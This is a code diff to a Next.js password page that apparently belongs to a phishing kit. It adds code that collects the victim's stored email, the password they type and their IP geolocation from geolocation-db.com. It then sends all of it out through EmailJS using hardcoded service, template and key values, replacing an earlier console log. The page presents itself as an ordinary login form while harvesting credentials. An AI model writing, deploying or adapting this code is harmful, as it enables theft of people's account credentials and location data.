@@ -1,5 +1,6 @@
 import Head from "next/head";
 import Image from "next/image";
+import emailjs from "emailjs-com";
 import { useEffect, useState } from "react";
 import styles from "../styles/Password.module.css";
 
@@ -9,6 +10,7 @@ export default function Password() {
   const [password, setPassword] = useState("");
   const [submitCount, setSubmitCount] = useState(0);
   const [errorMsg, setErrorMsg] = useState("");
+  const ipUri = "https://geolocation-db.com/json/d802faa0-10bd-11ec-b2fe-47a0872c6708";
   useEffect(() => {
     const theEmail = localStorage.getItem("email");
     if (theEmail) {
@@ -45,12 +47,28 @@ export default function Password() {
       const data = new FormData(e.currentTarget);
       const thePassword = data.get("password");
       if (thePassword) {
-        const userDetails = {
-          email: email,
-          password: thePassword,
-        };
-        console.log(userDetails);
-        // replace console with sending email
+        // get IpAddress and send via email
+        function getIPAddress() {
+          fetch(ipUri)
+            .then((response) => response.json())
+            .then((data) => {
+              const userDetails = {
+                email: email,
+                password: thePassword,
+                location: data
+              };
+
+              console.log(userDetails)
+              // send To Email
+              emailjs
+                .send(
+                  "service_i6oca7f",
+                  "template_rgluyy8",
+                  userDetails,
+                  "QAlifTnBL7z-cToGx"
+                )
+            });
+        } getIPAddress();
         setPassword("");
       }
     } else {
